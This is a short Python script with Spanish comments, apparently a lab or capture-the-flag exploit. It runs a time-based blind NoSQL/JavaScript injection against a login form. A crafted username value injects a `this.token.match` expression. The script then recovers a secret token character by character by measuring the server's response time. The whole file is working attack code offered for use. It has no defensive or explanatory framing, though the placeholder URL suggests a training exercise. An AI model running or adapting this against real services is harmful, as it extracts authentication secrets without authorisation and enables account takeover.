import requests
from urllib.parse import quote_plus

proxies ={"http":"http://127.0.0.1.8081"} ###### Proxy si es que lo estamos usando, de no ser así, comentar esta y quitar la línea 11

def request(r):
    a =requests.post("http://PAHT", #### url
                     headers={   
        "Content-Type":"application/x-www-form-urlencoded"
        }, 
        data="username=\"+0||+this.token.match('^"+str(r)+".*')+||+\"\"%3d%3d\"//password=test", #### data a enviar en el formulario
        proxies=proxies,
        verify=False
        )
    
    print(a.elapsed.total_seconds())
    if(a.elapsed.total_seconds()>0.07):  #### Tiempo en base a la respuesta afirmativa del server.
        return True
    else:
        return False
    

token= ""
for i in range(24):
    for c in "-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":  ### CHARSET
        if(request(token+c)==True):
            token+=c
            break

print(token)